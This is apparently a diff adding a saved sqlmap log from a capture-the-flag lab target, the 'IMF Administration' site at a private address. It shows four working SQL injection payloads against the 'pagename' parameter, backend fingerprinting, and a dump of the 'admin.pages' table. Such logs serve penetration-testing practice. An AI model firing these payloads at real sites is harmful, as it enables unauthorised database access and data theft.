@@ -1,0 +1,71 @@
+        ___
+       __H__
+ ___ ___["]_____ ___ ___  {1.2.7#stable}
+|_ -| . [']     | .'| . |
+|___|_  [)]_|_|_|__,|  _|
+      |_|V          |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting at 13:12:32
+
+[13:12:32] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: pagename (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: pagename=home' AND 3187=3187 AND 'usHz'='usHz
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: pagename=home' AND (SELECT 2096 FROM(SELECT COUNT(*),CONCAT(0x716b627671,(SELECT (ELT(2096=2096,1))),0x716a7a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'BYlt'='BYlt
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: pagename=home' AND SLEEP(5) AND 'DRpx'='DRpx
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 1 column
+    Payload: pagename=-4835' UNION ALL SELECT CONCAT(0x716b627671,0x466945467645735966464d5a7371784765426b56567a5a71656e6d4b416a7a5554766f7875705670,0x716a7a7071)#
+---
+[13:12:32] [INFO] testing MySQL
+[13:12:32] [INFO] confirming MySQL
+[13:12:32] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu 16.04 or 16.10 (yakkety or xenial)
+web application technology: Apache 2.4.18
+back-end DBMS: MySQL >= 5.0.0
+[13:12:32] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
+[13:12:32] [INFO] fetching current database
+[13:12:32] [INFO] fetching tables for database: 'admin'
+[13:12:32] [INFO] used SQL query returns 1 entries
+[13:12:32] [INFO] fetching columns for table 'pages' in database 'admin'
+[13:12:32] [INFO] used SQL query returns 3 entries
+[13:12:32] [INFO] starting 3 threads
+[13:12:32] [INFO] retrieved: "id","int(11)"
+[13:12:32] [INFO] retrieved: "pagedata","text"
+[13:12:32] [INFO] retrieved: "pagename","varchar(255)"
+[13:12:32] [INFO] fetching entries for table 'pages' in database 'admin'
+[13:12:32] [INFO] used SQL query returns 4 entries
+[13:12:32] [INFO] starting 4 threads
+[13:12:32] [INFO] retrieved: "1","Under Construction.","upload"
+[13:12:32] [INFO] retrieved: "2","Welcome to the IMF Administration.","home"
+[13:12:32] [INFO] retrieved: "3","Training classrooms available. <br /><img src="./images/whiteboard.jpg"><br /> Contact us for training.","tutorials-incomplete"
+[13:12:32] [INFO] retrieved: "4","<h1>Disavowed List</h1><img src="./images/redacted.jpg"><br /><ul><li>*********</li><li>****** ******</li><li>*******</li><li>**** ********</li></ul><br />-Secretary"...
+Database: admin
+Table: pages
+[4 entries]
++----+----------------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| id | pagename             | pagedata                                                                                                                                                              |
++----+----------------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| 1  | upload               | Under Construction.                                                                                                                                                   |
+| 2  | home                 | Welcome to the IMF Administration.                                                                                                                                    |
+| 3  | tutorials-incomplete | Training classrooms available. <br /><img src="./images/whiteboard.jpg"><br /> Contact us for training.                                                               |
+| 4  | disavowlist          | <h1>Disavowed List</h1><img src="./images/redacted.jpg"><br /><ul><li>*********</li><li>****** ******</li><li>*******</li><li>**** ********</li></ul><br />-Secretary |
++----+----------------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+
+[13:12:32] [INFO] table 'admin.pages' dumped to CSV file '/root/.sqlmap/output/192.168.92.178/dump/admin/pages.csv'
+[13:12:32] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.168.92.178'
+
+[*] shutting down at 13:12:32
+
